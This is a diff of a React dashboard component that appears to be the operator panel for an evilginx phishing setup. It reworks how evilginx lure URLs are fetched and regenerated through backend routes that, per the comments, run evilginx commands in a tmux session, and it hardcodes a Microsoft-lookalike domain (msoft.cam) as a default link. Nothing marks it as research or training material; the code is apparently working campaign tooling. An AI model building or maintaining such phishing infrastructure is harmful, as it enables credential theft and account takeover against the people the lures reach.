@@ -400,17 +400,13 @@ export default function Dashboard() {
   useEffect(() => {
     console.log("Dashboard component mounted - immediate link regeneration");
 
-    // Force immediate refresh of the link via evilginx command
-    const runEvilginxCommand = async () => {
+    // Force immediate refresh of the link by simulating dropdown selection
+    const runEvilginxCommandThroughDropdown = async () => {
       // Get saved lure ID from localStorage
       const savedLureId = localStorage.getItem("selectedLureId");
 
       if (savedLureId) {
-        console.log(
-          "Immediately running evilginx command for lureId:",
-          savedLureId
-        );
-        setLinkLoading(true);
+        console.log("Simulating dropdown selection for lureId:", savedLureId);
 
         try {
           // Force a direct call to the lures endpoint to get the index
@@ -420,7 +416,7 @@ export default function Dashboard() {
             const luresData = await luresResponse.json();
             const availableLures = luresData.lures || [];
 
-            // Set lures but don't await to avoid blocking
+            // Update lures first
             setLures(availableLures);
 
             // Find the index of the saved lure
@@ -429,208 +425,78 @@ export default function Dashboard() {
             );
 
             if (lureIndex >= 0) {
-              const selectedLure = availableLures[lureIndex];
-              // Immediately set the selected lure without waiting
-              setSelectedLure(selectedLure);
-
               console.log(
-                "IMMEDIATE execution of evilginx command for index:",
-                lureIndex
+                "Found lure at index:",
+                lureIndex,
+                "- DIRECTLY calling evilginx command"
               );
 
-              // Direct API call with cache-busting headers
-              const response = await fetch(
-                `/api/lure-url?lureIndex=${lureIndex}`,
-                {
-                  headers: {
-                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                    Pragma: "no-cache",
-                    Expires: "0",
-                  },
-                }
-              );
+              // DIRECTLY execute the evilginx command that the dropdown would run
+              // This ensures the command runs in the tmux session
+              try {
+                // This API directly runs the evilginx command in the tmux session
+                console.log(
+                  "Making direct API call to execute evilginx command"
+                );
+                const commandResponse = await fetch(
+                  `/api/lure-url?lureIndex=${lureIndex}`,
+                  {
+                    method: "GET",
+                    headers: {
+                      "Cache-Control": "no-cache, no-store, must-revalidate",
+                      Pragma: "no-cache",
+                      Expires: "0",
+                      "X-Force-Command": "true", // Signal to force execution
+                    },
+                  }
+                );
 
-              if (response.ok) {
-                const data = await response.json();
-                console.log("Immediate command response:", data);
-
-                if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
-                  console.log("Successfully got URL from command:", data.url);
-                  setFullLink(data.url);
-                } else {
+                if (commandResponse.ok) {
+                  const commandData = await commandResponse.json();
                   console.log(
-                    "Immediate command returned invalid URL:",
-                    data.url
+                    "Evilginx command executed successfully:",
+                    commandData
                   );
 
-                  // Try fallback
-                  const fallbackUrl = `${selectedLure.phishlet}.${
-                    selectedLure.hostname || window.location.hostname
-                  }${selectedLure.path}`;
-                  setFullLink(fallbackUrl);
+                  // Set the link from the command output
+                  if (
+                    commandData.url &&
+                    commandData.url !== "https://msoft.cam/wYyGBBeI"
+                  ) {
+                    setFullLink(commandData.url);
+
+                    // Also call handleLureChange to ensure UI is consistent
+                    // But we already have the link from the command
+                    const selectedLure = availableLures[lureIndex];
+                    setSelectedLure(selectedLure);
+                    setLinkLoading(false);
+                    return;
+                  }
+                } else {
+                  console.error(
+                    "Command execution failed with status:",
+                    commandResponse.status
+                  );
                 }
+              } catch (cmdError) {
+                console.error("Error executing evilginx command:", cmdError);
               }
+
+              // If direct command execution failed, fall back to handleLureChange
+              console.log("Falling back to handleLureChange");
+              handleLureChange(lureIndex.toString());
+              return;
             }
           }
         } catch (error) {
-          console.error("Error in immediate command execution:", error);
-        } finally {
-          setLinkLoading(false);
+          console.error("Error in dropdown simulation:", error);
         }
       }
     };
 
-    runEvilginxCommand();
+    // Execute immediately to ensure the command runs right away
+    runEvilginxCommandThroughDropdown();
   }, []); // Empty dependency array means this runs once on mount
-
-  // Replace the useEffect that immediately sets fullLink from localStorage
-  useEffect(() => {
-    const regenerateLink = async () => {
-      // Get saved lure ID from localStorage
-      const savedLureId = localStorage.getItem("selectedLureId");
-
-      if (savedLureId) {
-        console.log("Regenerating link for lureId:", savedLureId);
-        setLinkLoading(true);
-
-        // Try to get lure index from the savedLureId
-        // We'll need to fetch lures first if they're not available yet
-        try {
-          // If lures aren't loaded yet, fetch them
-          let availableLures = lures;
-          if (lures.length === 0) {
-            const luresResponse = await fetch("/api/lures");
-            if (luresResponse.ok) {
-              const luresData = await luresResponse.json();
-              availableLures = luresData.lures || [];
-              // Update lures state to avoid needing to fetch again
-              setLures(availableLures);
-            }
-          }
-
-          const lureIndex = availableLures.findIndex(
-            (lure) => lure.id === savedLureId
-          );
-
-          if (lureIndex >= 0) {
-            console.log("Found lure at index:", lureIndex);
-
-            // Run the evilginx command by calling lure-url API
-            // This will execute the command in the tmux session
-            console.log("EXPLICITLY running evilginx command via lure-url API");
-
-            try {
-              const response = await fetch(
-                `/api/lure-url?lureIndex=${lureIndex}`,
-                {
-                  // Add cache-busting parameter to prevent caching
-                  headers: {
-                    "Cache-Control": "no-cache",
-                    Pragma: "no-cache",
-                  },
-                }
-              );
-
-              console.log("API response status:", response.status);
-
-              if (response.ok) {
-                const data = await response.json();
-                console.log("Received lure URL response:", data);
-
-                if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
-                  console.log("Successfully regenerated lure URL:", data.url);
-                  setFullLink(data.url);
-                  setLinkLoading(false);
-                  return; // Success - exit early
-                } else {
-                  console.log("Received invalid URL from API:", data.url);
-                }
-              } else {
-                console.error(
-                  "Error response from lure-url API:",
-                  response.status
-                );
-                const errorText = await response.text();
-                console.error("Error details:", errorText);
-              }
-            } catch (error) {
-              console.error("Exception using lure-url API:", error);
-            }
-
-            // If first method failed, try the fallback
-            console.log("Primary method failed, trying fallback API");
-            try {
-              const linkResponse = await fetch(
-                `/api/full-link?lureId=${savedLureId}`,
-                {
-                  // Add cache-busting parameter to prevent caching
-                  headers: {
-                    "Cache-Control": "no-cache",
-                    Pragma: "no-cache",
-                  },
-                }
-              );
-              console.log("Fallback API response status:", linkResponse.status);
-
-              if (linkResponse.ok) {
-                const data = await linkResponse.json();
-                console.log("Fallback API response data:", data);
-
-                if (
-                  data.fullUrl &&
-                  data.fullUrl !== "https://msoft.cam/wYyGBBeI"
-                ) {
-                  console.log(
-                    "Successfully regenerated fallback URL:",
-                    data.fullUrl
-                  );
-                  setFullLink(data.fullUrl);
-                  setLinkLoading(false);
-                  return; // Success - exit early
-                } else {
-                  console.log(
-                    "Received invalid URL from fallback API:",
-                    data.fullUrl
-                  );
-                }
-              } else {
-                console.error(
-                  "Error response from fallback API:",
-                  linkResponse.status
-                );
-                const errorText = await linkResponse.text();
-                console.error("Error details:", errorText);
-              }
-            } catch (error) {
-              console.error("Exception using fallback API:", error);
-            }
-
-            // If all API calls failed, we'll fallback to a constructed URL
-            console.log("All API methods failed, using constructed URL");
-            // But need the lure details first
-            const selectedLure = availableLures.find(
-              (lure) => lure.id === savedLureId
-            );
-            if (selectedLure) {
-              const fallbackUrl = `${selectedLure.phishlet}.${
-                selectedLure.hostname || window.location.hostname
-              }${selectedLure.path}`;
-              console.log("Using constructed fallback URL:", fallbackUrl);
-              setFullLink(fallbackUrl);
-            }
-          } else {
-            console.log("Could not find lure with ID:", savedLureId);
-          }
-        } catch (error) {
-          console.error("Error regenerating link:", error);
-        } finally {
-          setLinkLoading(false);
-        }
-      }
-    };
-
-    regenerateLink();
-  }, [lures]); // Only depends on lures to avoid re-running too often
 
   // Modify the original useEffect to better handle lure selection
   useEffect(() => {
